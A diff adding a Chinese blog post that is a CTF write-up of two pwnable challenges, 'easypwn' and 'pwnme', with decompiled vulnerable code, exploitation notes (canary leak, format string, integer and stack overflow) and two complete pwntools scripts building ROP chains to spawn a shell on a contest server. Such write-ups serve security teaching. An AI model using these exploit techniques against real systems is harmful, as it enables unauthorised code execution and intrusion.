@@ -270,6 +270,163 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/08/i春秋pwnable-writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ditto">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ditto's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/08/i春秋pwnable-writeup/" itemprop="url">i春秋pwnable-writeup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-08T22:15:13+08:00">
+                2019-03-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  842
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello!I am the smartest robot in the universe!\nWho are you?"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Your name %s sounds so stupid!\nBut you don't looks like a fool,isn't it?\nso why don't tell me your real name?\n"</span>,</span><br><span class="line">    &amp;buf);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>64位程序，开启了canary和nx防护。<br>利用思路如下：<br>1.通过第一次的输入，覆盖canary高位的第一个字节为\x0a,利用printf中的%s，将canary的值打印出来。<br>2.由于题目没有给出动态库。可以通过puts泄露got表项内容，通过比对获知目标机器使用的动态库，或者写leak函数，结合pwntools的DynELF，泄露库中函数地址。<br>3.通过第二次溢出，构造ROPchain，利用read读取/bin/sh到bss段，接着调用system，获取shell。<br>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,10002)</span><br><span class="line">elf=ELF(<span class="string">"./easypwn"</span>)</span><br><span class="line">pop_rdi_ret=0x4007f3 <span class="comment">#pop rdi ret</span></span><br><span class="line">def leak(addr):</span><br><span class="line">    a.recvuntil(<span class="string">"Who are you?\n"</span>)</span><br><span class="line">    payload='A'*72</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">    canary=u64(a.recv(8))-0xa</span><br><span class="line">    a.recv()</span><br><span class="line">    payload='A'*72+p64(canary)</span><br><span class="line">    payload+='B'*8 <span class="comment"># fake rbp</span></span><br><span class="line">    payload+=p64(pop_rdi_ret)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    payload+=p64(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">    payload+=p64(0x4005D0)<span class="comment"># start address</span></span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!\n"</span>)</span><br><span class="line">    data=<span class="string">""</span></span><br><span class="line">    up=<span class="string">""</span></span><br><span class="line">    while True:</span><br><span class="line">        c=a.recv(1)</span><br><span class="line">        if up==<span class="string">"\n"</span> and c ==<span class="string">"H"</span>:</span><br><span class="line">            data=data[:-1]</span><br><span class="line">            data=data+<span class="string">"\x00"</span></span><br><span class="line">            break</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data+=c</span><br><span class="line">        up=c</span><br><span class="line">    return data[:4]</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">system_addr=d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher("system",system_addr)</span></span><br><span class="line">print(<span class="string">"system_addr = "</span>+hex(system_addr))</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">a.recvuntil(<span class="string">"Who are you?\n"</span>)</span><br><span class="line">payload='A'*72</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">canary=u64(a.recv(8))-0xa</span><br><span class="line">a.recv()</span><br><span class="line"><span class="comment">#ret2csu</span></span><br><span class="line">payload='A'*72</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+='B'*8</span><br><span class="line">payload+=p64(0x4007EA)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x00000000004007D0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
+<h4 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h4><p>程序中存在格式化串漏洞，栈溢出，整型溢出。做法有多种。</p>
+<p>这里存在格式化串漏洞：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_400AD1</span><span class="params">(<span class="keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> formata, __int64 a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里有整数溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/2.png" alt=""><br>由于char是8位，则输入的字节个数超过256即可绕过</p>
+<p>这里有栈溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/1.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">sub_400A90</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;s, a1, a2);#溢出了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里单独使用栈溢出来做。<br>完整exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="comment">#a=process("./pwnme")</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,<span class="string">"10006"</span>)</span><br><span class="line">offset=40</span><br><span class="line">elf=ELF(<span class="string">"./pwnme"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=0x400ed3</span><br><span class="line">length=260</span><br><span class="line">def init():</span><br><span class="line">    a.recvuntil(<span class="string">"Input your username(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Input your password(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    a.sendline(<span class="string">"2"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new username(max lenth:20): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new password(max lenth:20): \n"</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(0x400770)<span class="comment">#start_addr</span></span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">puts_addr=u64(a.recvuntil(<span class="string">"\n"</span>,drop=True).ljust(8,<span class="string">"\x00"</span>))</span><br><span class="line">print <span class="string">"puts_addr = "</span>+ str(hex(puts_addr))</span><br><span class="line">init()</span><br><span class="line">libc=LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">system_addr=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">print hex(system_addr)</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(0x400eca)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x400eb0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(0x400770)</span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1286,7 +1443,7 @@ call printf
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1357,7 +1514,7 @@ call printf
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">8.4k</span>
+    <span title="Site words total count">9.2k</span>
   
 </div>
 
